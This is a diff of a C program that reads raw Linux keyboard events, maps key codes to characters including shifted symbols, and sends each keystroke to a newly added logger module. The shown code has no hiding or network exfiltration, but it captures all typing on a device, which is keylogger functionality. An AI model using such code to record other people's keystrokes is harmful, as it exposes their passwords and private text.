@@ -4,6 +4,7 @@
 #include <unistd.h>
 #include <stdbool.h>
 #include <linux/input.h>
+#include "logger.h"
 
 // #define TAM_MAX 50
 
@@ -24,6 +25,9 @@ int main(int argc, char* argv[]){
        perror("Deu merda, menor");
        exit(EXIT_FAILURE);
     }
+
+    logger_init();
+    set_terminal(1);
 
     bool shift = false;
     bool caps = false;
@@ -66,7 +70,20 @@ int main(int argc, char* argv[]){
         [KEY_7] = {'7', '&', false},
         [KEY_8] = {'8', '*', false},
         [KEY_9] = {'9', '(', false},
-        [KEY_0] = {'0', ')', false}
+        [KEY_0] = {'0', ')', false},
+
+        [KEY_SPACE] = {' ', ' ', false},
+
+        [KEY_102ND] = {'\\', '|', false},
+        [KEY_COMMA] = {',', '<', false},
+        [KEY_DOT] = {'.', '>', false},
+        [KEY_SLASH] = {';', ':', false},
+        [KEY_RO] = {'/', '?', false},
+        [KEY_MINUS] = {'-', '_', false},
+        [KEY_EQUAL] = {'=', '+', false},
+        [KEY_RIGHTBRACE] = {'[', '{', false},
+        [KEY_BACKSLASH] = {']', '}', false},
+        [KEY_ENTER] = {'\n', '\n', false}
     };
     
     // char buffer[TAM_MAX];
@@ -76,6 +93,10 @@ int main(int argc, char* argv[]){
     // long int count = 0;
     while(read(fin, &ie, sizeof(ie)) == sizeof(ie)){
         if(ie.type != EV_KEY) continue;
+        // printf("Count: %ld\n", count);
+        // printf("Type: %d\n", ie.type);
+        // printf("Code: %d\n", ie.code);
+        // printf("Value: %d\n", ie.value);
         if(ie.code == KEY_LEFTSHIFT || ie.code == KEY_RIGHTSHIFT){
             if(ie.value == 1) shift = true;
             else if (ie.value == 0) shift = false;
@@ -88,14 +109,31 @@ int main(int argc, char* argv[]){
 
         if(ie.value != 1) continue;
 
+        if(ie.code == KEY_BACKSPACE){
+            putchar('\b');
+            putchar(' ');
+            putchar('\b');
+            fflush(stdout);
+            continue;
+        }
+
+        if(ie.code == KEY_TAB){
+            putchar(' ');
+            putchar(' ');
+            putchar(' ');
+            putchar(' ');
+            fflush(stdout);
+            continue;
+        }
+
         keymap_entry entry = keymap[ie.code];
         
         if(entry.alfabetico) upper = shift ^ caps;
         else upper = shift;
 
         if(entry.normal == '\0') continue;
-        putchar(upper ? entry.shift : entry.normal);
-        fflush(stdout);
+        logger_putc(upper ? entry.shift : entry.normal);
+        logger_flush();
     }
 
     return 0;
